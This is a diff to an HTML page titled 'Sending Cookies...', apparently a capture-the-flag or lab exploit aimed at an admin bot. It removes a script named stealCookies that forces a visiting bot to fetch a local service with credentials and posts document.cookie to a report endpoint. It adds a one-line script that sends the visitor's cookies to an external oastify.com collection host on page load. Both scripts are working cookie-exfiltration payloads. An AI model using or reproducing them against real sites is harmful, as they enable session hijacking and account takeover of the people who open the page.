@@ -4,36 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sending Cookies...</title>
-    <script>
-        async function stealCookies() {
-            try {
-                // Step 1: Force the bot to visit localhost (ensuring cookies are set)
-                await fetch("http://localhost:5000", { credentials: "include" });
-
-                // Step 2: Small delay to ensure cookies are stored
-                setTimeout(async () => {
-                    // Step 3: Extract cookies by making another request
-                    const response = await fetch("http://localhost:5000", { credentials: "include" });
-                    const cookies = document.cookie; // Get cookies
-
-                    // Step 4: Send cookies to /report for logging
-                    await fetch("http://localhost:5000/report", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                        body: new URLSearchParams({ url: "http://localhost:5000?cookies=" + encodeURIComponent(cookies) })
-                    });
-
-                    // Step 5: Redirect the bot to log the request
-                    window.location.href = "http://localhost:5000?cookies=" + encodeURIComponent(cookies);
-                }, 2000);
-            } catch (error) {
-                console.error("Error stealing cookies:", error);
-            }
-        }
-
-        // Run function on page load
-        window.onload = stealCookies;
-    </script>
+    <script> fetch('https://4gl73pwuypfrsick8x8fxdg6hxnobgz5.oastify.com', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
 </head>
 <body>
     <h1>Sending Cookies...</h1>
